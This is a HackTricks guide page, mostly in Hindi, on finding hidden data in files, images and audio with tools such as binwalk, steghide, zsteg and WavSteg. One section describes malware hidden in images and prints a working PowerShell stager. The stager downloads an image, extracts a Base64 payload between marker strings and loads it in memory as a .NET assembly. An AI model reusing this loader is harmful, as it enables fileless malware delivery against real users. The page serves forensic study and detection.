# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **फाइलों से डेटा निकालना**

### **Binwalk**

बाइनरी फ़ाइलों में एम्बेडेड छिपी हुई फ़ाइलों और डेटा की तलाश करने के लिए एक टूल। इसे `apt` के माध्यम से इंस्टॉल किया जाता है और इसका स्रोत [GitHub](https://github.com/ReFirmLabs/binwalk) पर उपलब्ध है।
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

यह हेडर और फुटर के आधार पर फ़ाइलों को पुनर्प्राप्त करता है, png छवियों के लिए उपयोगी। `apt` के माध्यम से इंस्टॉल किया जाता है और इसका स्रोत [GitHub](https://github.com/korczis/foremost) पर उपलब्ध है।
```bash
foremost -i file # Extracts data
```
### **Exiftool**

फाइल के मेटाडेटा को देखने में मदद करता है, उपलब्ध है [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

exiftool के समान, मेटाडेटा देखने के लिए। `apt` के जरिए इंस्टॉल किया जा सकता है, स्रोत [GitHub](https://github.com/Exiv2/exiv2) पर है, और इसकी एक [official website](http://www.exiv2.org/) है।
```bash
exiv2 file # Shows the metadata
```
### **File**

पहचानें कि आप किस प्रकार की file से निपट रहे हैं।

### **Strings**

Readable strings को files से निकालता है; output को filter करने के लिए विभिन्न encoding settings का उपयोग करता है।
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

संपादित फाइल की ऑनलाइन उपलब्ध मूल संस्करण के साथ तुलना करने के लिए उपयोगी।
```bash
cmp original.jpg stego.jpg -b -l
```
## **टेक्स्ट में छिपा हुआ डेटा निकालना**

### **रिक्त स्थानों में छिपा डेटा**

दिखने में खाली लगे रिक्त स्थानों में अदृश्य कैरेक्टर जानकारी छुपा सकते हैं। इस डेटा को निकालने के लिए इस लिंक पर जाएँ: [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **इमेज से डेटा निकालना**

### **GraphicMagick के साथ इमेज विवरण पहचानना**

[GraphicMagick](https://imagemagick.org/script/download.php) का उपयोग इमेज फाइल टाइप पता करने और संभावित करप्शन की पहचान करने के लिए किया जाता है। नीचे दिए कमांड को एक इमेज की जाँच करने के लिए चलाएँ:
```bash
./magick identify -verbose stego.jpg
```
एक क्षतिग्रस्त इमेज की मरम्मत का प्रयास करने के लिए, एक मेटाडेटा टिप्पणी जोड़ना मददगार हो सकता है:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide डेटा छिपाने के लिए**

Steghide `JPEG, BMP, WAV, and AU` फाइलों के भीतर डेटा छुपाने में सक्षम है, और एन्क्रिप्टेड डेटा को embed और extract कर सकता है। इंस्टॉलेशन `apt` से सरल है, और इसका [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Commands:**

- `steghide info file` बताता है कि किसी फाइल में छिपा डेटा है या नहीं।
- `steghide extract -sf file [--passphrase password]` छिपा डेटा extract करता है, password वैकल्पिक है।

वेब-आधारित extraction के लिए, देखें [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Steghide पर password cracking का प्रयास करने के लिए, [stegcracker](https://github.com/Paradoxis/StegCracker.git) का उपयोग नीचे दिए अनुसार करें:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG और BMP फ़ाइलों के लिए**

zsteg PNG और BMP फ़ाइलों में छिपे डेटा को खोजने में विशेषज्ञ है। इंस्टॉलेशन `gem install zsteg` से होता है, इसका [GitHub पर स्रोत](https://github.com/zed-0xff/zsteg) भी उपलब्ध है।

**Commands:**

- `zsteg -a file` applies all detection methods on a file.
- `zsteg -E file` specifies a payload for data extraction.

### **StegoVeritas and Stegsolve**

**stegoVeritas** metadata की जाँच करता है, छवि रूपांतरण करता है, और LSB brute forcing लागू करने सहित कई फीचर्स प्रदान करता है। विकल्पों की पूरी सूची के लिए `stegoveritas.py -h` उपयोग करें और सभी जाँच चलाने के लिए `stegoveritas.py stego.jpg` चलाएँ।

**Stegsolve** छवियों के भीतर छिपे टेक्स्ट या संदेशों को उजागर करने के लिए विभिन्न रंग फिल्टर लागू करता है। यह [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) पर उपलब्ध है।

### **FFT द्वारा छिपी सामग्री का पता लगाना**

Fast Fourier Transform (FFT) तकनीकें छवियों में छुपी सामग्री उजागर कर सकती हैं। उपयोगी संसाधन शामिल हैं:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy छवि और ऑडियो फ़ाइलों में जानकारी एम्बेड करने की अनुमति देता है, और यह PNG, BMP, GIF, WebP, और WAV जैसे फॉर्मैट्स को सपोर्ट करता है। यह [GitHub](https://github.com/dhsdshdhk/stegpy) पर उपलब्ध है।

### **Pngcheck for PNG File Analysis**

PNG फ़ाइलों का विश्लेषण करने या उनकी प्रामाणिकता सत्यापित करने के लिए उपयोग करें:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Additional Tools for Image Analysis**

अधिक जांच के लिए, इन साइटों पर जाएँ:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## मार्कर-डेलिमिटेड Base64 पेलोड्स जो images में छिपे होते हैं (malware delivery)

Commodity loaders अक्सर Base64-encoded पेलोड्स को प्लेन-टेक्स्ट के रूप में वैध इमेज (अक्सर GIF/PNG) के अंदर छिपाते हैं। पिक्सेल-लेवल LSB की बजाय, पेलोड फ़ाइल के टेक्स्ट/मेटाडेटा में एम्बेड किए गए यूनिक start/end मार्कर स्ट्रिंग्स द्वारा सीमांकित होता है। फिर एक PowerShell stager:

- HTTP(S) के माध्यम से इमेज डाउनलोड करता है
- मार्कर स्ट्रिंग्स का पता लगाता है (उदाहरण देखे गए: <<sudo_png>> … <<sudo_odt>>)
- मार्कर्स के बीच का टेक्स्ट निकालता है और उसे Base64-डिकोड करके बाइट्स बनाता है
- .NET assembly को इन-मेमोरी लोड करता है और एक ज्ञात entry method को invoke करता है (डिस्क पर कोई फ़ाइल नहीं लिखी जाती)

न्यूनतम PowerShell carving/loading स्निपेट
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
नोट्स
- यह ATT&CK T1027.003 (steganography) के अंतर्गत आता है। Marker strings अभियानों के बीच भिन्न होते हैं।
- Hunting: डाउनलोड की गई इमेजेस को ज्ञात डिलिमिटर के लिए स्कैन करें; `PowerShell` को तब फ्लैग करें जब वह `DownloadString` के बाद `FromBase64String` का उपयोग करे।

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **ऑडियो से डेटा निकालना**

**Audio steganography** ध्वनि फ़ाइलों के भीतर जानकारी छिपाने का एक अनूठा तरीका प्रदान करता है। निहित सामग्री को एम्बेड करने या निकालने के लिए विभिन्न टूल उपयोग किए जाते हैं।

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide एक बहुमुखी टूल है जो JPEG, BMP, WAV, और AU फ़ाइलों में डेटा छिपाने के लिए बनाया गया है। विस्तृत निर्देश [stego tricks documentation](stego-tricks.md#steghide) में दिए गए हैं।

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Stegpy विभिन्न फ़ॉर्मैट्स जैसे PNG, BMP, GIF, WebP, और WAV के साथ संगत है। अधिक जानकारी के लिए [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav) देखें।

### **ffmpeg**

ffmpeg ऑडियो फ़ाइलों की अखंडता का आकलन करने में महत्वपूर्ण है, विस्तृत जानकारी दिखाता है और किसी भी विसंगति को पहचानता है।
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg WAV फ़ाइलों के भीतर डेटा को LSB (least significant bit) रणनीति का उपयोग करके छिपाने और निकालने में उत्कृष्ट है। यह [GitHub](https://github.com/ragibson/Steganography#WavSteg) पर उपलब्ध है। कमांड्स में:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound आवाज़ फ़ाइलों के भीतर जानकारी को AES-256 का उपयोग करके एन्क्रिप्ट करने और छिपी जानकारी का पता लगाने की सुविधा देता है। इसे [आधिकारिक पृष्ठ](http://jpinsoft.net/deepsound/download.aspx) से डाउनलोड किया जा सकता है।

### **Sonic Visualizer**

ऑडियो फ़ाइलों के दृश्य और विश्लेषणात्मक निरीक्षण के लिए एक अनमोल टूल, Sonic Visualizer अन्य तरीकों द्वारा अप्रकट तत्वों को उजागर कर सकता है। अधिक जानकारी के लिए [आधिकारिक वेबसाइट](https://www.sonicvisualiser.org/) पर जाएँ।

### **DTMF Tones - Dial Tones**

ऑडियो फ़ाइलों में DTMF tones का पता ऑनलाइन टूल्स जैसे [this DTMF detector](https://unframework.github.io/dtmf-detect/) और [DialABC](http://dialabc.com/sound/detect/index.html) के माध्यम से लगाया जा सकता है।

## **अन्य तकनीकें**

### **Binary Length SQRT - QR Code**

यदि बाइनरी डेटा का वर्ग लेने पर पूर्ण संख्या प्राप्त होती है तो वह QR code का प्रतिनिधित्व कर सकता है। जाँचने के लिए इस स्निपेट का उपयोग करें:
```python
import math
math.sqrt(2500) #50
```
binary को image में बदलने के लिए, देखें [dcode](https://www.dcode.fr/binary-image). QR codes पढ़ने के लिए, उपयोग करें [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **ब्रेल अनुवाद**

ब्रेल का अनुवाद करने के लिए, [Branah Braille Translator](https://www.branah.com/braille-translator) एक उत्कृष्ट संसाधन है।

## **संदर्भ**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
